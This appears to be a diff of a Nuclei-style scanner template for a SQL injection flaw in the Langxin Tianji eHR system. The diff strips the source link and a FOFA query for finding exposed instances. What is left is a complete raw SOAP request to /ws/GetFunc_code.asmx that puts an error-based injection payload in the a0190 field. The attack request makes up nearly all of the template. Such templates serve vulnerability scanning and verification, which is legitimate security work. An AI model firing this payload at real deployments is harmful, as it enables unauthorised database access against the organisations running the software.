@@ -3,12 +3,8 @@ info:
   name: 朗新天霁ehr-GetShortMessage-sql注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/us8gdza5z5d9e5p1'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: us8gdza5z5d9e5p1
-    fofa: body="ClientBin/MainProgram.xap"||body='Tool/Silverlight.exe'
 http:
 - raw:
   - "POST /ws/GetFunc_code.asmx HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36\nContent-Type: text/xml; charset=utf-8\nSOAPAction: \"http://tempuri.org/GetShortMessage\"\nContent-Length: 376\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetShortMessage xmlns=\"http://tempuri.org/\">\n      <a0190>-7952' and 1=user--+</a0190>\n    </GetShortMessage>\n  </soap:Body>\n</soap:Envelope>"
